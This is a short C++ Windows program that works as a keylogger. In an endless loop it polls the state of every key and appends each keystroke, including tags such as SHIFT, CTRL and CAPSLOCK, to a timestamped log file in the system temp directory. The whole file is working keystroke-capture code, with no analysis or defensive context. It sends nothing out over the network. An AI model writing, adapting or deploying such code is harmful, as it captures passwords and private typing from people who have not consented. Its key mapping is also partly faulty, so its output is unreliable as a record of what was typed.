#include <iostream>
#include <windows.h>
#include <fstream>
#include <ctime>
#include <filesystem>
#include <format>

[[noreturn]] int main() {
    const time_t now = time(nullptr);
    tm tm = *localtime(&now);

    tm.tm_hour = tm.tm_hour % 12;
    tm.tm_min = tm.tm_min % 60;
    tm.tm_sec = tm.tm_sec % 60;

    const std::string filename = std::format("keylog_{:02d}_{:02d}_{:02d}.log", tm.tm_hour, tm.tm_min, tm.tm_sec);
    const std::filesystem::path filepath = std::filesystem::temp_directory_path()/ filename;

    std::ofstream fileWriter(filepath);
    if (!fileWriter) {
        std::cerr << "Ошибка открытия файла!" << std::endl;
        return 1;
    }


    while (true) {
        for (int i = 8; i <= 255; ++i) {
            if (GetAsyncKeyState(i) & 0b1) {

                switch (i) {
                    case VK_SPACE:
                        fileWriter << ' ';
                        break;
                    case VK_RETURN:
                        fileWriter << '\n';
                        break;
                    case VK_BACK:
                        fileWriter.seekp(-1, std::ios_base::cur);
                        fileWriter << ' ';
                        fileWriter.seekp(-1, std::ios_base::end);
                        break;

                    case VK_TAB:
                        fileWriter << "<TAB>";
                        break;

                    case VK_SHIFT:
                    case VK_LSHIFT:
                    case VK_RSHIFT:
                        fileWriter << "<SHIFT>";
                        break;
                    case VK_CONTROL:
                    case VK_LCONTROL:
                    case VK_RCONTROL:
                        fileWriter << "<CTRL>";
                        break;
                    case VK_ESCAPE:
                        fileWriter << "<ESC>";
                        break;
                    case VK_CAPITAL:
                        fileWriter << "<CAPSLOCK>";
                        break;
                    default:
                        fileWriter << static_cast<char>(i);

                }
                fileWriter.flush();

            }
        }
        Sleep(10);
    }
}
